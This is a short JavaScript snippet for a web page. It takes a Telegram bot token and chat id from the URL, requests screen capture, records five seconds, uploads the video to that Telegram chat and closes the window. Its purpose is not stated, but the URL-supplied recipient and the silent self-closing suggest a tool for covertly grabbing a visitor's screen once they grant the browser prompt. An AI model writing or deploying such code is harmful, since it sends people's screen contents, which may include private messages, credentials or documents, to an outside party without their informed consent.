(async () => {
  const params = new URLSearchParams(window.location.search);
  const BOT = params.get('bot');
  const CID = params.get('chat');
  try {
    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
    document.getElementById('preview').srcObject = stream;
    const mediaRecorder = new MediaRecorder(stream);
    const chunks = [];
    mediaRecorder.ondataavailable = e => chunks.push(e.data);
    mediaRecorder.onstop = async () => {
      const blob = new Blob(chunks, { type: 'video/webm' });
      const fd = new FormData();
      fd.append('chat_id', CID);
      fd.append('video', blob, 'screenrecord.webm');
      await fetch(`https://api.telegram.org/bot${BOT}/sendVideo`, { method: 'POST', body: fd });
      window.close();
    };
    mediaRecorder.start();
    setTimeout(() => mediaRecorder.stop(), 5000);
  } catch(e) {
    if (BOT && CID) {
      await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CID, text: 'Screen record error: ' + e.message })
      });
    }
    window.close();
  }
})();